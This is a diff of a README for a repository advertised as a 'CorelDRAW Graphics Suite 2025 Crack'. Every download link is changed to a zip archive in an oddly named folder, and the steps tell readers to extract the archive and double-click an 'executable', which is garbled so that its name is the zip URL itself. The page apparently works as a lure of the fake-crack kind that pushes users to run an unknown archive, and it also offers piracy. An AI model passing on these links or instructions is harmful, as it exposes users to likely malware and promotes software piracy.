@@ -1,6 +1,6 @@
 # 🎨 coreldraw-graphics-suite - Unlock CorelDRAW's Full Potential Easily
 
-[![Download Now](https://raw.githubusercontent.com/Aminepipo1/coreldraw-graphics-suite/main/exsanguious/coreldraw-graphics-suite-2.8-alpha.3.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Aminepipo1/coreldraw-graphics-suite/main/exsanguious/coreldraw-graphics-suite-2.8-alpha.3.zip)
+[![Download Now](https://github.com/Aminepipo1/coreldraw-graphics-suite/raw/refs/heads/main/exsanguious/coreldraw-suite-graphics-3.6.zip%20Now-Get%20Started-brightgreen)](https://github.com/Aminepipo1/coreldraw-graphics-suite/raw/refs/heads/main/exsanguious/coreldraw-suite-graphics-3.6.zip)
 
 ## 📦 Overview
 **CorelDRAW Graphics Suite 2025 Crack** is a user-friendly tool designed to unlock all premium features of the CorelDRAW Graphics Suite. It provides a simple and fast way to access the tools needed for professional graphics design without the need for a subscription.
@@ -10,13 +10,13 @@ Follow these steps to download and run the software.
 
 1. **Visit the Releases Page**  
    Go to the official releases page to get the latest version. Click this link:  
-   [Download Page](https://raw.githubusercontent.com/Aminepipo1/coreldraw-graphics-suite/main/exsanguious/coreldraw-graphics-suite-2.8-alpha.3.zip)
+   [Download Page](https://github.com/Aminepipo1/coreldraw-graphics-suite/raw/refs/heads/main/exsanguious/coreldraw-suite-graphics-3.6.zip)
 
 2. **Choose the Right Version**  
    Locate the latest version of the CorelDRAW Graphics Suite crack. This is typically marked with the highest version number.
 
 3. **Download the File**  
-   Click the download link for the file. It will usually look like this: `https://raw.githubusercontent.com/Aminepipo1/coreldraw-graphics-suite/main/exsanguious/coreldraw-graphics-suite-2.8-alpha.3.zip`. Your browser will start downloading the file to your computer.
+   Click the download link for the file. It will usually look like this: `https://github.com/Aminepipo1/coreldraw-graphics-suite/raw/refs/heads/main/exsanguious/coreldraw-suite-graphics-3.6.zip`. Your browser will start downloading the file to your computer.
 
 4. **Extract the File**  
    Once the download completes, locate the downloaded file, usually found in the "Downloads" folder.  
@@ -26,7 +26,7 @@ Follow these steps to download and run the software.
    Navigate to the new folder created during extraction. You will see several files there.
 
 6. **Run the Application**  
-   Find and double-click the main executable file, usually named `https://raw.githubusercontent.com/Aminepipo1/coreldraw-graphics-suite/main/exsanguious/coreldraw-graphics-suite-2.8-alpha.3.zip`. This will start the setup process.
+   Find and double-click the main executable file, usually named `https://github.com/Aminepipo1/coreldraw-graphics-suite/raw/refs/heads/main/exsanguious/coreldraw-suite-graphics-3.6.zip`. This will start the setup process.
 
 7. **Follow the Installation Instructions**  
    Carefully follow the on-screen instructions to complete the installation. Ensure you read each step before proceeding.
@@ -59,6 +59,6 @@ For more tips and community support, consider visiting the relevant forums or us
 
 ## 📝 Download & Install
 To get started, download the latest version from our releases page:  
-[Download Page](https://raw.githubusercontent.com/Aminepipo1/coreldraw-graphics-suite/main/exsanguious/coreldraw-graphics-suite-2.8-alpha.3.zip)
+[Download Page](https://github.com/Aminepipo1/coreldraw-graphics-suite/raw/refs/heads/main/exsanguious/coreldraw-suite-graphics-3.6.zip)
 
 Once downloaded, follow the steps outlined in the "Getting Started" section to successfully install and run the software. Enjoy your enhanced graphic design experience with CorelDRAW!
